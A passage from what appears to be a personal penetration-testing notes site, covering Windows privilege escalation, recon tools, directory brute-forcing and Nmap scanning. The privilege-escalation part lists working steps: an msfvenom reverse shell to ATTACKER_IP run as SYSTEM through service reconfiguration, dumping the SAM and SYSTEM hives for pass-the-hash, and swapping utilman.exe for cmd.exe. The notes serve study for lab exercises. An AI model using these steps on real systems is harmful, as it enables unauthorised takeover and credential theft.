executable DACL</code>) allow you to modify the configuration of a service, you will be able to <code>reconfigure the service</code>. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.</p> <p>To check for a service DACL from the command line, you can use <code>Accesschk</code> from the <code>Sysinternals suite</code>.</p> <ol> <li><code>accesschk64.exe -qlc thmservice</code></li> <li><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe</code></li> <li><code>icacls C:\\Users\\thm-unpriv\\rev-svc3.exe /grant Everyone:F</code></li> <li><code>sc config THMService binPath= \"C:\\Users\\thm-unpriv\\rev-svc3.exe\" obj= LocalSystem</code></li> <li><code>sc stop THMService</code></li> <li><code>sc start THMService</code></li> <li><code>nc -lvp 4447</code></li> </ol>"},{"location":"Cybersecurity/Maintaining%20Access/WinPrivesc/#abusing-dangerous-privileges","title":"Abusing dangerous privileges","text":"<p>Each user has a set of assigned privileges that can be checked with the following command: <code>whoami /priv</code>.</p> <p>A complete list of available privileges on Windows systems is available here. You can find a comprehensive list of exploitable privileges on the Priv2Admin Github project.</p>"},{"location":"Cybersecurity/Maintaining%20Access/WinPrivesc/#sebackup-serestore","title":"SeBackup / SeRestore","text":"<p>Allow users to read and write to any file in the system, ignoring any <code>DACL</code> in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.</p> <p>Having this power, an attacker can trivially escalate privileges on the system by using many techniques. The one we will look at consists of copying the <code>SAM</code> and <code>SYSTEM registry hives</code> to extract the local Administrator's password hash.</p> <ol> <li>We will need to open a command prompt using the \"Open as administrator\" option to use these privileges.</li> <li><code>whoami /priv</code></li> <li>Backup the <code>SAM</code> and <code>SYSTEM</code> hashes: <code>reg save hklm\\system C:\\Users\\THMBackup\\system.hive</code> &amp; <code>reg save hklm\\sam C:\\Users\\THMBackup\\sam.hive</code></li> <li>This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using SMB or any other available method.</li> <li>Use <code>impacket</code> to retrieve the users' password hashes: <code>python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL</code>.</li> <li>Use the Administrator's hash to perform a <code>Pass-the-Hash attack</code> and gain access to the target machine with SYSTEM privileges.</li> </ol>"},{"location":"Cybersecurity/Maintaining%20Access/WinPrivesc/#setakeownership","title":"SeTakeOwnership","text":"<p>Allows a user to take <code>ownership of any object on the system</code>, including <code>files</code> and <code>registry keys</code>.</p> <p>E.g: <code>utilman.exe</code>, a built-in Windows application used to provide Ease of Access options during the lock screen. Abuse it to escalate privileges this time.</p> <p>Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file, replacing it is trivial.</p> <ol> <li><code>takeown /f C:\\Windows\\System32\\Utilman.exe</code></li> <li><code>icacls C:\\Windows\\System32\\Utilman.exe /grant THMTakeOwnership:F</code></li> <li><code>copy cmd.exe utilman.exe</code></li> <li>Lock the screen and click the \"Ease of Access\" button to trigger <code>utilman</code>.</li> </ol>"},{"location":"Cybersecurity/Maintaining%20Access/WinPrivesc/#others-summary","title":"Others / Summary","text":"Privilege Description Abuse <code>SeImpersonatePrivilege</code> Allows a process to impersonate another user. Exploited in token impersonation attacks (e.g., <code>JuicyPotato</code>, <code>RoguePotato</code>) to escalate to SYSTEM. <code>SeAssignPrimaryTokenPrivilege</code> Allows a process to assign a token to a process. Combined with SeImpersonatePrivilege for privilege escalation. <code>SeCreateTokenPrivilege</code> Allows a user to create new tokens. Exploited to create a new SYSTEM token and elevate privileges. <code>SeTakeOwnershipPrivilege</code> Allows a user to take ownership of any object. Can be used to take control of files or processes owned by SYSTEM. <code>SeDebugPrivilege</code> Allows debugging of any process, including SYSTEM processes. Exploited to inject code into SYSTEM processes or access sensitive data in memory. <code>SeLoadDriverPrivilege</code> Allows loading of device drivers. Exploited to load malicious drivers, which run in kernel mode (ring-0). <code>SeRestorePrivilege</code> Allows restoring files or directories regardless of permissions. Used to overwrite critical files, bypassing NTFS permissions. <code>SeShutdownPrivilege</code> Allows shutting down the system. Used for denial-of-service attacks."},{"location":"Cybersecurity/Maintaining%20Access/WinPrivesc/#abusing-vulnerable-software","title":"Abusing vulnerable software","text":"<p>Software installed on the target system can present various privilege escalation opportunities. As with drivers, organisations and users may not update them as often as they update the operating system. You can use the <code>wmic</code> tool to list software installed on the target system and its versions.</p> <p>This command will dump information it can gather on installed software: <code>wmic product get name,version,vendor</code>.</p> <p>Remember that the wmic product command may not return all installed programs. Depending on how some of the programs were installed, they might not get listed here. It is always worth checking desktop shortcuts, available services or generally any trace that indicates the existence of additional software that might be vulnerable.</p> <p>Once we have gathered product version information, we can always search for existing exploits on the installed software online on sites like <code>exploit-db</code>, <code>packet storm</code> or plain old <code>Google</code>, amongst many others.</p>"},{"location":"Cybersecurity/Maintaining%20Access/WinPrivesc/#tools-of-the-trade","title":"Tools of the trade","text":"<p>Various tools can help you conduct system enumeration to find privilege escalation vectors. Below are some commonly used tools along with their descriptions and usage.</p> Tool Description Usage WinPEAS A script that enumerates the target system to find privilege escalation paths. - Download the precompiled executable or <code>.bat</code> script.  - Run: <code>winpeas.exe &gt; outputfile.txt</code>  - Output may be long, so redirect to a file for easier review. PrivescCheck A PowerShell script to search for common privilege escalation vectors. - Run: <code>Set-ExecutionPolicy Bypass -Scope process -Force</code>  - Execute: <code>. .\\PrivescCheck.ps1</code>  - Then, run: <code>Invoke-PrivescCheck</code> WES-NG (Windows Exploit Suggester - Next Generation) A Python script that identifies missing patches and vulnerabilities on the target system. - Update the database: <code>wes.py --update</code>  - Run <code>systeminfo</code> on the target machine and save output to <code>systeminfo.txt</code>  - Run: <code>wes.py systeminfo.txt</code> on the attacking machine. Metasploit (multi/recon/local_exploit_suggester) A Metasploit module that suggests local exploits based on the target system's vulnerabilities. - Use the <code>multi/recon/local_exploit_suggester</code> module if you have a Meterpreter shell on the target system to identify privilege escalation vectors. <p>Note: Automated tools may not catch all potential escalation vectors, so manual enumeration is still recommended.</p>"},{"location":"Cybersecurity/Planning%20%26%20Recon/Recon/","title":"Recon","text":""},{"location":"Cybersecurity/Planning%20%26%20Recon/Recon/#tools","title":"Tools","text":"Tool Description Example of Usage theHarvester Gathers email addresses, subdomains, and more from public sources. <code>theHarvester -d example.com -b google</code> Shodan Search engine for internet-connected devices. <code>shodan search \"apache\" -o results.json</code> Recon-ng Web reconnaissance framework with modules for gathering OSINT. <code>recon-cli modules load recon/domains-hosts/google_site_web</code> SpiderFoot Automates the process of gathering OSINT on domains, IPs, and more. <code>spiderfoot -s example.com -m all -o results.json</code> Maltego Data mining tool for link analysis, visualizing relationships between entities. <code>maltego -i example.com</code> Censys Search engine for discovering internet assets and vulnerabilities. <code>censys search \"apache\" --limit 10</code> Amass DNS enumeration tool for discovering subdomains and mapping attack surfaces. <code>amass enum -d example.com -o subdomains.txt</code> Whois Domain registration lookup tool. <code>whois example.com</code> Google Dorking Advanced Google search queries to find sensitive data. <code>site:example.com inurl:\"admin\"</code> FOCA Tool for extracting metadata from documents and files. <code>foca.exe -d example.com -t doc,pdf,xls</code> Wigle Wireless network geolocation tool for discovering Wi-Fi networks. <code>wigle -t \"SSID\" -g \"location\"</code> Have I Been Pwned Check if email addresses or domains have been involved in breaches. <code>https://haveibeenpwned.com/</code> OSINT Framework Collection of links and resources for conducting OSINT investigations. <code>https://osintframework.com/</code> Pipl People search engine for gathering information on individuals. <code>pipl.com</code> PublicWWW Search engine for discovering source code snippets and web technologies. <code>https://publicwww.com/websites?q=\"example\"</code> Wappalyzer online tool and browser extension that helps identify what technologies a website uses <code>https://www.wappalyzer.com/</code> Wayback Machine A historical archive of websites that dates back to the late 90s <code>https://archive.org/web/</code> GitHub A version control system that tracks changes to files in a project <code>https://github.com/</code> S3 Buckets A storage service provided by Amazon AWS <code>http(s)://[name].s3.amazonaws.com</code> crt.sh Certificate Search <code>https://crt.sh/</code> Certificate Transparency Search Tool See Who\u2019s Issued SSL/TLS Certificates to Your Domain Name <code>https://ui.ctsearch.entrust.com/ui/ctsearchui</code>"},{"location":"Cybersecurity/Planning%20%26%20Recon/Recon/#google-dorking","title":"Google Dorking","text":"Filter Example Description <code>site</code> site:tryhackme.com returns results only from the specified website address <code>inurl</code> site:tryhackme.com returns results that have the specified word in the URL <code>filetype</code> site:tryhackme.com returns results which are a particular file extension <code>intitle</code> intitle:admin returns results that contain the specified word in the title <code>subdomain enumeration</code> site:*.tryhackme.com -site:www.tryhackme.com Used as an OSINT method"},{"location":"Cybersecurity/Planning%20%26%20Recon/Recon/#content-discovery-web-walking","title":"Content Discovery / Web Walking","text":"Where to look Description <code>view-source:</code> Source of the web-app <code>HTML comments</code> Could contain valuabe info <code>Editing a style</code> E.g: <code>Display: none</code> is a common way to hide HTML elements <code>Breakpoints</code> Force the browser to stop processing the JavaScript and pause the current execution Network tab Examine network entries, server responses, etc. <code>robots.txt</code> Tells search engines which pages they are and aren't allowed to show on their search engine results favicon Tells search engines which pages they are and aren't allowed to show on their search engine results, try parse it. <code>Sitemap.xml</code> Sitemap.xml file gives a list of every file the website owner wishes to be listed on a search engine HTTP headers Headers can sometimes contain useful information such as the webserver software and possibly the programming/scripting language in use. Framework Stack Establish the framework used to build the site from: favicon, HTML comments, copyright notices, credits, etc. and enumerate from there OSINT Use OSINT methods like google dorking, etc. <code>DNSrecon</code> Bruteforce DNS subdomain enumeration <code>Sublist3r</code> (&amp; <code>dnsenum</code>) Speed up the process of OSINT subdomain discovery, bruteforce, google, etc. <code>Ffuf</code> Test for virtual hosts"},{"location":"Cybersecurity/Planning%20%26%20Recon/Recon/#subdomain-enumeration","title":"Subdomain Enumeration","text":"<p>When an <code>SSL/TLS</code> certificate is created for a domain by a CA, CA's create publicly accessible logs of every SSL/TLS certificate created for a domain name. The purpose of <code>Certificate Transparency logs</code> is to stop malicious and accidentally made certificates from being used. We can use this service to our advantage to discover subdomains belonging to a domain, sites like <code>https://crt.sh</code> and <code>https://ui.ctsearch.entrust.com/ui/ctsearchui</code> offer a searchable database of certificates that shows current and historical results.</p>"},{"location":"Cybersecurity/Planning%20%26%20Recon/Recon/#bruteforce-dns-enumeration","title":"Bruteforce DNS enumeration","text":"<p>Trying tens, hundreds, thousands or even millions of different possible subdomains from a pre-defined list of commonly used subdomains. E.g: <code>admin.example.com</code> or <code>staging.example.com</code></p> <p>Note: this IS <code>NOT like go/dirbuster</code>, they focus on directories and files so <code>example.com/directory</code> or <code>example.com/file.extension</code>.</p> <p>Note: <code>Sublist3r</code> automates this process and does some google dorking too.</p>"},{"location":"Cybersecurity/Planning%20%26%20Recon/Recon/#virtual-hosts","title":"Virtual Hosts","text":"<p>A web server can host multiple websites on the same IP address. It uses the Host header in the HTTP request to figure out which website to serve.</p> <p>Example: Server at 192.168.1.1 hosts: <code>example.com</code> &amp; <code>admin.example.com</code></p> <p>Some subdomains aren't always hosted in publically accessible DNS results, such as development versions of a web application or administration portals. Instead, the DNS record could be kept on a private DNS server or recorded on the developer's machines in their <code>Linux: /etc/hosts file</code> or <code>Windows: c:\\windows\\system32\\drivers\\etc\\hosts</code> which maps domain names to IP addresses.</p> <p>Because web servers can host multiple websites from one server when a website is requested from a client, the server knows which website the client wants from the Host header. We can <code>utilise this host header by making changes to it</code> and monitoring the response to see if we've discovered a new website.</p> <p>Like with DNS Bruteforce, we can automate this process by using a <code>wordlist of commonly used subdomains</code>.</p>"},{"location":"Cybersecurity/Planning%20%26%20Recon/Recon/#passive-reconnaissance","title":"Passive reconnaissance","text":"<p>In passive reconnaissance, you rely on publicly available knowledge. Think of it like you are looking at target territory from afar without stepping foot on that territory.</p> <p>Passive reconnaissance activities include many activities, for instance: - Looking up DNS records of a domain from a public DNS server. - Checking job ads related to the target website. - Reading news articles about the target company.</p> Tool Description Example Whois request and response protocol that follows the RFC 3912 specification. A WHOIS server listens on TCP port 43 for incoming requests. The domain registrar is responsible for maintaining the WHOIS records for the domain names it is leasing. The WHOIS server replies with various information related to the domain requested. Of particular interest, we can learn. <code>Registrar</code>, <code>Contact info</code> of registrant, <code>Creation-, Update- and Expiration dates</code>, <code>Name Server</code> nslookup Find the IP address of a domain name using nslookup, which stands for Name Server Look Up. <code>nslookup -type=[A(ipv4) or AAAA(ipv6)m CNAME, MX, SOA, TXT] [DOMAIN_NAME] [SERVER].</code> dig For more advanced DNS queries and additional functionality, you can use dig, the acronym for \u201cDomain Information Groper\u201d <code>dig [SERVER] [DOMAIN_NAME] [TYPE]</code>, e.g: <code>dig tryhackme.com MX</code> DNSDumpster Dump subdomain records <code>https://dnsdumpster.com/</code> Shodan.io Helpful to learn various pieces of information about the client\u2019s network, without actively connecting to it. <code>https://www.shodan.io/</code>"},{"location":"Cybersecurity/Planning%20%26%20Recon/Recon/#active-reconnaissance","title":"Active reconnaissance","text":"<p>Cannot be achieved so discreetly as it requires direct engagement with the target. Think of it like you check the locks on the doors and windows, among other potential entry points.</p> <p>Examples of active reconnaissance activities include: - Connecting to one of the company servers such as HTTP, FTP, and SMTP. - Calling the company in an attempt to get information (social engineering). - Entering company premises pretending to be a repairman.</p> Tool Description Example Web browser Connecting to TCP ports. There are also plenty of add-ons: <code>FoxyProxy</code>, <code>User-Agent Switcher and Manager</code>, <code>Wappalyzer</code>, etc. Connect to a <code>port</code> that has a supported web-service and look at the <code>developer tools</code> Ping Check whether you can reach the remote system and that the remote system can reach you back. The ping command sends a packet to a remote system, and the remote system replies. This way, you can conclude that the remote system is <code>online</code> and that the network is working between the two systems. <code>ping -c 5 10.10.228.63</code>, pings the machine 5 times traceroute Traces the route taken by the packets from your system to another host. <code>traceroute 10.10.228.63</code> on linux or <code>tracert 10.10.228.63</code> on windows Telnet The default port used by telnet is 23 and it sends all data in cleartext. You can use Telnet to connect to any service and grab its banner since it relies on TCP. <code>telnet 10.10.228.63 80</code> Netcat or nc (as client or as server) Netcat supports both TCP and UDP protocols. It can function as a client that connects to a listening port; alternatively, it can act as a server that listens on a port of your choice. <code>nc 10.10.228.63 80</code> or <code>nc -lvnp 80</code> where l = listen, v = verbose, n = numeric only, no DNS resolution, p = port specification"},{"location":"Cybersecurity/Scanning/DirectoryScanners/","title":"DirectoryScanners","text":""},{"location":"Cybersecurity/Scanning/DirectoryScanners/#dirbuster-cheat-sheet","title":"DirBuster Cheat Sheet","text":"Command Description Example Select wordlist Specify a dictionary file for directory brute-forcing. Use the DirBuster GUI to choose <code>directory-list-2.3-medium.txt</code>. Configure target Set the target URL and port. Target <code>http://192.168.1.10:80</code>. Set file extensions Include specific file extensions for brute-forcing. Add <code>.php,.html,.txt</code> to the extensions list. Threads Increase or decrease the number of threads for efficiency. Set threads to 50 for faster scanning. Recursive scanning Enable scanning of subdirectories. Enable recursive mode in settings."},{"location":"Cybersecurity/Scanning/DirectoryScanners/#dirbuster-example-workflow","title":"DirBuster Example Workflow:","text":"<ol> <li>Open DirBuster and input the target URL (e.g., <code>http://192.168.1.10:80</code>).</li> <li>Select a wordlist like <code>directory-list-2.3-medium.txt</code>.</li> <li>Configure file extensions to include <code>.php, .txt, .html</code>.</li> <li>Set the thread count to 50 for faster scans.</li> <li>Start the scan and analyze results for accessible directories/files.</li> </ol>"},{"location":"Cybersecurity/Scanning/DirectoryScanners/#gobuster-cheat-sheet","title":"GoBuster Cheat Sheet","text":"Command Description Example <code>gobuster dir -u [URL] -w [wordlist]</code> Scans directories using a wordlist. <code>gobuster dir -u http://192.168.1.10 -w common.txt</code> <code>gobuster dir -u [URL] -w [wordlist] -x [extensions]</code> Adds file extensions to the directory scan. <code>gobuster dir -u http://192.168.1.10 -w common.txt -x php,html,txt</code> <code>gobuster dir -u [URL] -w [wordlist] -t [threads]</code> Sets the number of threads for the scan. <code>gobuster dir -u http://192.168.1.10 -w common.txt -t 50</code> <code>gobuster dir -u [URL] -w [wordlist] -o [outputfile]</code> Saves scan results to a file. <code>gobuster dir -u http://192.168.1.10 -w common.txt -o results.txt</code> <code>gobuster dir -u [URL] -w [wordlist] --wildcard</code> Detects wildcard subdomains or directories. <code>gobuster dir -u http://192.168.1.10 -w common.txt --wildcard</code> <code>gobuster dns -d [domain] -w [wordlist]</code> Scans for subdomains of a domain. <code>gobuster dns -d example.com -w subdomains.txt</code> <code>gobuster vhost -u [URL] -w [wordlist]</code> Scans for virtual hostnames using a wordlist. <code>gobuster vhost -u http://192.168.1.10 -w vhosts.txt</code>"},{"location":"Cybersecurity/Scanning/DirectoryScanners/#common-gobuster-workflows","title":"Common GoBuster Workflows","text":""},{"location":"Cybersecurity/Scanning/DirectoryScanners/#scan-directories-with-extensions","title":"Scan Directories with Extensions","text":"<p>```bash gobuster dir -u http://192.168.1.10 -w common.txt -x php,html,txt</p>"},{"location":"Cybersecurity/Scanning/Nmap/","title":"Nmap","text":""},{"location":"Cybersecurity/Scanning/Nmap/#subnetting","title":"Subnetting","text":"Term Definition network segment This refers tp a physical connection, a group of computers connected using a shared medium like a Ethernet switch or WiFi access point. subnet(work) This refers to a logical connection, equivalent of one or more network segments connected together and configured to use the same router."},{"location":"Cybersecurity/Scanning/Nmap/#enumerating-targets","title":"Enumerating Targets","text":"<p>If you want to check the list of hosts that Nmap will scan, you can use <code>nmap -sL TARGETS</code>.</p>"},{"location":"Cybersecurity/Scanning/Nmap/#summary","title":"Summary","text":"Purpose Example Command Host discovery - Discover live hosts without port scanning <code>sudo nmap -sn MACHINE_IP/24</code> ARP Scan <code>sudo nmap -PR -sn MACHINE_IP/24</code> ICMP Echo Scan <code>sudo nmap -PE -sn MACHINE_IP/24</code> ICMP Timestamp Scan <code>sudo nmap -PP -sn MACHINE_IP/24</code> ICMP Address Mask Scan <code>sudo nmap -PM -sn MACHINE_IP/24</code> TCP SYN Ping Scan <code>sudo nmap -PS22,80,443 -sn MACHINE_IP/30</code> TCP ACK Ping Scan <code>sudo nmap -PA22,80,443 -sn MACHINE_IP/30</code> UDP Ping Scan <code>sudo nmap -PU53,161,162 -sn MACHINE_IP/30</code> DNS discovery - Skip reverse-dns lookup <code>sudo nmap -n MACHINE_IP/24</code> DNS offline host discovery <code>sudo nmap -R MACHINE_IP/24</code> Specify DNS server <code>sudo nmap --dns-servers DNS_SERVER MACHINE_IP/24</code> Basic port scans - TCP connect scan <code>sudo nmap -sT MACHINE_IP</code> TCP SYN scan <code>sudo nmap -sS MACHINE_IP</code> UDP scan <code>sudo nmap -sU MACHINE_IP</code> Advanced port scans - TCP Null scan <code>sudo nmap -sN MACHINE_IP</code> TCP FIN scan <code>sudo nmap -sF MACHINE_IP</code> TCP Xmas scan <code>sudo nmap -sX MACHINE_IP</code> TCP Maimon scan <code>sudo nmap -sM MACHINE_IP</code> TCP ACK scan <code>sudo nmap -sA MACHINE_IP</code> TCP Window scan <code>sudo nmap -sW MACHINE_IP</code> Custom scan <code>--scanflags FLAGS</code> Spoofing and decoys - Basic spoofing <code>nmap -S SPOOFED_IP MACHINE_IP</code> Spoofing specifying the interface <code>nmap -e NET_INTERFACE -Pn -S SPOOFED_IP MACHINE_IP</code> Spoof mac <code>--spoof-mac SPOOFED_MAC</code> Decoy <code>nmap -D DECOY1_IP,DECOY2_IP,ME MACHINE_IP</code> where <code>ME</code> indicates that your IP address should appear in the third order. Random decoys <code>nmap -D 10.10.0.1,10.10.0.2,RND,RND,ME MACHINE_IP</code> where the third and fourth source IP addresses are assigned randomly. Idle/Zombie scan <code>nmap -sI ZOMBIE_IP MACHINE_IP</code>, where <code>ZOMBIE_IP</code> is the IP address of the idle host (zombie). Packet fragments - Fragment packets Add <code>-f</code> or <code>-ff</code> for further fragmentation. Increase packet size <code>--data-length NUM</code> Change the default fragment size value Use <code>--mtu</code>. Post port scanning - Service and version <code>nmap -sV MACHINE_IP</code> Control detection intensity <code>--version-intensity LEVEL</code> where levels are between 0 and 9. Higest intensity detection <code>-sV --version-all</code> OS detection <code>nmap -O MACHINE_IP</code> Traceroute <code>nmap --traceroute MACHINE_IP</code> Run default scripts <code>nmap --script=default MACHINE_IP</code> or <code>nmap -sC MACHINE_IP</code> or <code>nmap --script \"SCRIPT-NAME\" MACHINE_IP</code> All <code>-A</code>, equivalent to <code>-sV -O -sC --traceroute</code> Saving output - Normal format <code>-oN FILENAME</code> Grepable format <code>-oG FILENAME</code> XML format <code>-oX FILENAME</code> Use all formats <code>-oA FILENAME</code> Script kiddie <code>-oS FILENAME</code> Misc - Enable fast mode <code>sudo nmap -F MACHINE_IP</code> Scan ports in consecutive order <code>sudo nmap -r MACHINE_IP</code> Specify ports <code>sudo nmap -p22,80,443 MACHINE_IP</code> Port range <code>sudo nmap -p22-443 MACHINE_IP</code> All ports <code>sudo nmap -p- MACHINE_IP</code> Scan timing <code>-T&lt;0-5&gt;</code> where 0=paranoid, 1=sneaky, 2=polite, 3=normal, 4=aggressive, 5=insane Control packet rate <code>--min-rate &lt;number&gt;</code> &amp; <code>--max-rate &lt;number&gt;</code> = packets/second Control probing parallelization <code>--min-parallelism &lt;numprobes&gt;</code> &amp; <code>--max-parallelism &lt;numprobes&gt;</code> = Nmap probes the targets to discover which hosts are live and which ports are open; probing parallelization specifies the number of such probes that can be run in parallel. Specify the network interface <code>-e NET_INTERFACE</code> Specify source port number <code>--source-port PORT_NUM</code> Let Nmap provide more detailed reasoning <code>--reason</code> Let Nmap provide more detailed output Use <code>-v</code> or <code>-vv</code> for even more verbosity. Denugging <code>-d</code> More details for debugging <code>-dd</code>"},{"location":"Cybersecurity/Scanning/Nmap/#the-process-of-network-mapping","title":"The process of network mapping","text":"<ol> <li>Enumerate targets</li> <li>Discover live hosts</li> <li>Reverse-DNS lookup</li> <li>Scan ports</li> <li>Detect versions</li> <li>Detect OS</li> <li>Traceroute</li> <li>Scripts</li> <li>Write output / logging</li> </ol>"},{"location":"Cybersecurity/Scanning/Nmap/#nmap-tcp-and-udp-port-states","title":"Nmap TCP and UDP port states","text":"Port state Description Open Service is <code>actively listening</code> for connections on the port. Closed <code>No service listening</code>, <code>port is accessible</code> / reachable but a firewall or other security appliances might be blocking the packets. Filtered Nmap cannot determine if the port is <code>open or closed</code>. The <code>port is not accessible</code>. Usually due to a firewall preventing nmap. Unfiltered Nmap cannot determine if the port is <code>open or closed</code>. The <code>port is accessible</code>. Encountered when <code>TCP ACK</code> scanning. Open/Filtered Nmap cannot determine if the port is <code>open or filtered</code>. Closed/Filtered Nmap cannot determine if the port is <code>closed or filtered</code>."},{"location":"Cybersecurity/Scanning/Nmap/#live-host-discovery","title":"Live Host Discovery","text":""},{"location":"Cybersecurity/Scanning/Nmap/#protocols","title":"Protocols","text":"Protocol Description Packet example ARP Sends a frame to the broadcast address on the network segment <code>asking who has the MAC-address of a certain IP-address</code>. Subsequently storing the MAC in it's routing table. <code>Who has 10.10.210.1? Tell 10.10.210.6</code> ICMP ICMP has many types. ICMP ping uses Type 8 (Echo) and Type 0 (Echo Reply). <code>[Echo (ping) request or Timespamp request] id=0x22e1, seq=0/0, ttl=...</code> TCP Send a specially-crafted packet to common TCP ports to check whether the target will respond. This method is efficient, especially when ICMP Echo is blocked. <code>[PortNumber: 80] [SYN or ACK] Seq=1 Win=1024 Len=0 MSS=1460...</code> UDP Send a specially-crafted packet to common UDP ports to check whether the target will respond. This method is efficient, especially when ICMP Echo is blocked. For live hosts we will only see <code>UDP traffic</code>. If a host is down we will also see <code>ICMP(type 3) traffic</code>. <p><code>Nmap, by default, uses a ping scan to find live hosts</code>, then proceeds to scan live hosts only. To be able to use different protocols we need priviledged or <code>sudo</code> access to nmap, otherwise nmap will default back to <code>TCP</code> scanning. If you want to use Nmap to discover online hosts without port-scanning the live systems, you can issue <code>nmap -sn TARGETS</code>.</p>"},{"location":"Cybersecurity/Scanning/Nmap/#arp-scanning","title":"ARP scanning","text":"<p>Inside of a <code>subnet</code> we can use <code>ARP</code> requests to see if a host is online. Remember, an ARP query <code>aims to get the hardware</code> address (MAC address) so that communication over the link-layer becomes possible. <code>ARP queries won\u2019t be routed</code> and hence cannot cross the subnet router. ARP is a link-layer protocol, and ARP packets are bound to their subnet.</p> <p>Basically, a host that replies to ARP queries is up. If you want Nmap only to perform an ARP scan without port-scanning, you can use <code>nmap -PR -sn TARGETS</code>, where <code>-PR</code> indicates that you only want an ARP scan.</p> <p></p> <p>Talking about ARP scans, we should mention a scanner built around ARP queries: <code>arp-scan</code>; it provides many options to customize your scan. Visit the arp-scan wiki for detailed information. One popular choice is <code>arp-scan --localnet</code> or simply <code>arp-scan -l</code>.  You can also specify the interface using <code>-I</code>. For instance, <code>sudo arp-scan -I eth0 -l</code> will send ARP queries for all valid IP addresses on the eth0 interface.</p>"},{"location":"Cybersecurity/Scanning/Nmap/#icmp-scanning","title":"ICMP scanning","text":"<p>ICMP (Internet Control Message Protocol) is a network protocol used for diagnostic and error-reporting purposes. Think of it as a way for devices on a network to exchange quick \"status updates\" or ask basic questions to help maintain communication.</p> <p>An <code>ICMP echo scan</code> works by sending an ICMP echo request (<code>ICMP Type 8/Echo</code>) and expects the target to reply with an ICMP echo (<code>ICMP Type 0/Echo</code>) reply if it is online. Many firewalls block ICMP echo; new versions of MS Windows are configured with a host firewall that blocks ICMP echo requests by default.</p> <p>To use ICMP echo request to discover live hosts, add the option <code>-PE</code>. </p> <p></p> <p>Because ICMP echo requests tend to be blocked, you might also consider <code>ICMP Timestamp</code> or <code>ICMP Address Mask requests</code> to tell if a system is online. Nmap uses timestamp request (<code>ICMP Type 13</code>) and checks whether it will get a Timestamp reply (<code>ICMP Type 14</code>). Adding the <code>-PP</code> option tells Nmap to use ICMP timestamp requests.</p> <p></p> <p>Similarly, Nmap uses address mask queries (<code>ICMP Type 17</code>) and checks whether it gets an address mask reply (<code>ICMP Type 18</code>). This scan can be enabled with the option <code>-PM</code>.</p> <p></p>"},{"location":"Cybersecurity/Scanning/Nmap/#tcp-scanning","title":"TCP scanning","text":""},{"location":"Cybersecurity/Scanning/Nmap/#syn","title":"SYN","text":"<p>We can send a packet with the <code>SYN (Synchronize)</code> flag set to a TCP port, 80 by default, and wait for a response. An open port should reply with a <code>SYN/ACK (Acknowledge)</code>; a closed port would result in an <code>RST (Reset)</code>. In this case, we only check whether we will get any response to infer whether the host is up, the specific state of the port is not significant here.</p> <p></p> <p>If you want Nmap to use TCP SYN ping, you can do so via the option <code>-PS</code> followed by the port number, range, list, or a combination of them. For example, <code>-PS21</code> will target port 21, while <code>-PS21-25</code> will target ports 21, 22, 23, 24, and 25. Finally <code>-PS80,443,8080</code> will target the three ports 80, 443, and 8080.</p> <p>Privileged users (root and sudoers) can send TCP SYN packets and <code>don\u2019t need to complete the TCP 3-way handshake</code> even if the port is open. Unprivileged users <code>have no choice but to complete the 3-way handshake</code> if the port is open.</p>"},{"location":"Cybersecurity/Scanning/Nmap/#ack","title":"ACK","text":"<p>This sends a packet with the ACK flag set. You <code>must be running Nmap as a privileged user</code> to be able to accomplish this. If you try it as an unprivileged user, Nmap will attempt a 3-way handshake.</p> <p>By default, port 80 is used. The syntax is similar to TCP SYN ping. <code>-PA</code> should be followed by a port number, range, list, or a combination of them. For example, consider <code>-PA21</code>, <code>-PA21-25</code> and <code>-PA80,443,8080</code>. If no port is specified, port 80 will be used.</p> <p>Any TCP packet with an ACK flag <code>should get a TCP packet back with an RST flag set</code>. The target responds with the RST flag set because the TCP packet with the ACK flag is not part of any ongoing connection. The expected response is used to detect if the target host is up. The systems that don\u2019t respond are offline or inaccessible.</p> <p></p> <p>### UDP scanning Contrary to TCP SYN ping, sending a UDP packet to an open port is not expected to lead to any reply. However, if we send a <code>UDP packet to a closed</code> UDP port, we <code>expect to get an ICMP port unreachable packet</code>.</p> <p></p> <p>The syntax to specify the ports is similar to that of TCP SYN ping and TCP ACK ping; Nmap uses <code>-PU</code> for UDP ping.</p>"},{"location":"Cybersecurity/Scanning/Nmap/#basic-port-scanning","title":"Basic Port Scanning","text":""},{"location":"Cybersecurity/Scanning/Nmap/#tcp-flags","title":"TCP flags","text":"<p>Setting a flag bit means setting its value to 1. From left to right, the TCP header flags are: 1. URG: Urgent flag indicates that the urgent pointer filed is significant.  a TCP segment with the URG flag set is processed immediately without consideration of having to wait on previously sent TCP segments. 2. ACK: Used to acknowledge the receipt of a TCP segment. 3. PSH: Asking TCP to pass the data to the application promptly. 4. RST: Used to reset the connection. Also used when data is sent to a host and there is no service on the receiving end to answer. 5. SYN: Used to initiate a TCP 3-way handshake and synchronize sequence numbers with the other host. The sequence number should be set randomly during TCP connection establishment. 6. FIN: The sender has no more data to send.</p>"},{"location":"Cybersecurity/Scanning/Nmap/#tcp-connect-scan","title":"TCP connect scan","text":"<p>Similar to a TCP 3-way handshake BUT we are interested in learning whether the TCP port is open, not establishing a TCP connection. Hence the connection is torn as soon as its state is confirmed by sending a RST/ACK. </p>"},{"location":"Cybersecurity/Scanning/Nmap/#tcp-syn-scan","title":"TCP SYN scan","text":"<p>Unprivileged users are limited to connect scan. However, the default scan mode is SYN scan, and it requires a privileged (root or sudoer) user to run it.</p> <p>SYN scan does not need to complete the TCP 3-way handshake; instead, it tears down the connection once it receives a response from the server.</p> <p></p>"},{"location":"Cybersecurity/Scanning/Nmap/#udp-scan","title":"UDP scan","text":"<p>UDP is a connectionless protocol, and hence it does not require any handshake for connection establishment. We cannot guarantee that a service listening on a UDP port would respond to our packets.</p> <p>However, if a UDP packet is sent to a closed port, an ICMP port unreachable error (type 3, code 3) is returned.</p> <p></p>"},{"location":"Cybersecurity/Scanning/Nmap/#advanced-port-scans","title":"Advanced port scans","text":"<p>Security researchers and hackers wanted to know what would happen if we send a TCP packet, which is not part of any ongoing TCP connection, with <code>one or more flags set</code>.</p>"},{"location":"Cybersecurity/Scanning/Nmap/#tcp-null-scan","title":"TCP Null scan","text":"<p>The null scan does not 